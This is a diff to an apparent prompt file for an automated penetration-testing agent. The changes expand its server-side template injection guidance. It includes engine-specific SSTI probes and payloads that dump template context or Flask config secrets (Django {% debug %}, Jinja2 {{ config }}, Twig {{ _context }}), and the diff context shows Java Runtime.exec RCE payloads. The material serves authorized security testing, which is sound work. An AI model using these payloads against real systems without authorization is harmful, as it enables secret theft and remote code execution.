@@ -198,9 +198,26 @@ If sstimap reports an engine + injection point, take the suggested PoC and re-ru
 manually via execute_curl to capture the exact payload form.
 
 If sstimap fails but you suspect SSTI (param reflected in HTML, framework hints
-present), drop to manual probes. See `RCE Payload Reference` -> SSTI section
-for engine-specific math probes (Jinja2 `{{{{7*7}}}}`, Freemarker `${{7*7}}`,
-ERB `<%= 7*7 %>`, etc.). If math evaluates -> SSTI confirmed.
+present), drop to manual probes. Fingerprint the ENGINE first -- there is NO
+universal SSTI oracle:
+
+- **Arithmetic-evaluating engines** (Jinja2, Twig, Freemarker, Velocity, ERB,
+  Smarty, Mako) evaluate a math probe to `49` (Jinja2 `{{{{7*7}}}}`, Freemarker
+  `${{7*7}}`, ERB `<%= 7*7 %>`). Math evaluating -> SSTI confirmed.
+- **Logic-less / sandboxed engines** (Django templates, Handlebars, Mustache,
+  Liquid, Go text/template) do NOT compute `7*7`; they render empty, echo it, or
+  raise a template error the app may swallow into a blank page/redirect. A probe
+  that does NOT return `49` is therefore NOT evidence of "not SSTI" -- it may be
+  the WRONG probe for THIS engine. Confirm these by their own tag/variable
+  facility and by DATA disclosure: read a variable already in the render context
+  (Django `{{% debug %}}` dumps the entire context). Disclosing an in-context
+  secret IS the win -- no code execution required. See "Logic-less / sandboxed
+  engines" in `RCE Payload Reference`.
+- **Deferred / stateful sinks:** the render may happen on a LATER request than
+  the one you inject on (welcome/confirmation pages, generated emails/PDFs,
+  dynamically-built JS/CSS, multi-step wizards). Carry the session forward and
+  drive the ENTIRE flow to its rendered artifact before concluding "not
+  reflected." Absence of reflection on the injection request proves nothing.
 
 #### 4C. Insecure deserialization (CONDITIONAL on `RCE_DESERIALIZATION_ENABLED`)
 
@@ -354,8 +371,14 @@ Before classifying a finding, verify:
   be a static error / WAF block message?
 - For timing oracles: is the delta >= 800ms vs baseline AND reproducible? Below
   that threshold = noise, not RCE.
-- For SSTI: did `7*7` produce 49 (or `7*'7'` produce string repetition)? Just
-  reflecting the literal probe text is NOT SSTI -- the engine must evaluate it.
+- For SSTI on an arithmetic-evaluating engine: did `7*7` produce 49 (or `7*'7'`
+  produce string repetition)? Just reflecting the literal probe text is NOT SSTI
+  -- the engine must evaluate it. But do NOT invert this into "no 49 means no
+  SSTI": on a logic-less/sandboxed engine (Django templates, Handlebars,
+  Mustache, Liquid, Go) `7*7` never computes, yet a rendered context variable or
+  a `{{% debug %}}`-style context dump straight from the engine IS confirmed SSTI
+  (data disclosure). Confirm by the engine's own facility, and drive stateful
+  sinks to their deferred render before declaring the class dead.
 """
 
 
@@ -801,6 +824,38 @@ $ex.waitFor()
 ```
 ${T(java.lang.Runtime).getRuntime().exec('id')}
 *{T(java.lang.Runtime).getRuntime().exec('id')}
+```
+
+**Logic-less / sandboxed engines (arithmetic does NOT evaluate -- this is expected, NOT "no SSTI")**
+
+These engines do not compute `7*7`; a non-`49` result is NOT proof the sink is inert.
+Confirm them by their own variable/tag facility. The win is usually DATA already present
+in the render context (a variable, config, secret, debug dump) -- code execution is
+typically unavailable and unnecessary.
+```
+Django templates (Python/Django) -- SANDBOXED
+{% debug %}                          -> dumps the ENTIRE render context (read it for secrets)
+{{ known_context_var }}              -> renders any variable the view passed to the template
+{% for k, v in some_dict.items %}{{ k }}={{ v }}{% endfor %}
+  Do NOT expect {{7*7}} to work here; Django templates raise TemplateSyntaxError on it (often
+  swallowed by an app catch-all -> blank page or redirect). Wins are data disclosure, not
+  __class__ object traversal.
+
+Handlebars (Node)   {{this}} / {{#each this}}{{@key}}={{this}}{{/each}}   (data; escalate via prototype gadget)
+Mustache (many)     {{.}} / {{#section}}...{{/section}}                    (pure logic-less -> data disclosure only)
+Liquid (Ruby)       {{ page }} / {{ site }} / {{ settings }} / {% assign %}
+Go text/template    {{ . }} prints the whole data object; {{ printf "%d" 49 }}
+```
+
+**Data-disclosure primitives (read the render context before reaching for RCE)**
+
+The sensitive value is often ALREADY in the render context; read it first:
+```
+Jinja2 / Flask : {{ config }}   (Flask config, often SECRET_KEY)    {{ self.__dict__ }}
+Twig           : {{ _context }} (all template vars)                 {{ dump() }} (Debug extension)
+Django         : {% debug %}    {{ context_var }}
+Any engine     : a secret/credential surfaced from the render context is a complete,
+                 reportable win -- no code execution needed.
 ```
 
 **Pug (Node.js)**
